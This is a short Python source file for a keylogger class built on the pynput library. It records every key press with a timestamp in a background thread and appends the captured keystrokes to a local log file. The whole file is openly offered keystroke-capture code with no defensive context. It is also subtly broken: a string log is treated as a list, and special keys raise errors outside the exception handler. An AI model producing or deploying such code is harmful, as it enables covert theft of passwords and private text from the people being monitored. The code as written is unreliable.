from pynput import keyboard
import threading, json
from typing import Optional, List
from datetime import datetime


class Keylogger:
    def __init__(
        self,
        max_log_size: int = 10000,
        log_file: Optional[str] = None,
        filter_keys: Optional[List[str]] = [],
    ) -> None:
        self._listener: Optional[keyboard.Listener] = None
        self._thread: Optional[threading.Thread] = None
        self.is_listening = False
        self.log = ""
        self._stop_event = threading.Event()
        self.filter_keys = filter_keys
        self.max_log_size = max_log_size
        self.log_file = log_file

    def _on_press(self, key) -> None:
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f"[{key.name}]"

        if key.char in self.filter_keys:
            return

        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "key": key.char,
        }
        self.log.append(log_entry)

        if len(self.log) >= self.max_log_size:
            self._save_log_to_file()

    def _save_log_to_file(self) -> None:
        if not self.log_file:
            return

        log_data = json.dumps(self.log, indent=2)
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_data + "\n")
        self.log.clear()

    def _start_listener(self) -> None:
        with keyboard.Listener(on_press=self._on_press) as listener:
            self._listener = listener
            listener.join()

    def start(self) -> None:
        if not self.is_listening:
            self.is_listening = True
            self.log = ""
            self._thread = threading.Thread(target=self._start_listener)
            self._thread.start()

    def stop(self) -> None:
        if self.is_listening and self._listener:
            self.is_listening = False
            self._listener.stop()
            if self._thread:
                self._thread.join()

    def get_log(self, as_string: bool = False) -> str | List[dict]:
        if as_string:
            return "\n".join(
                [f"{entry['timestamp']}: {entry['key']}" for entry in self.log]
            )
        return self.log
    
    def clear_log(self) -> None:
        self.log.clear()
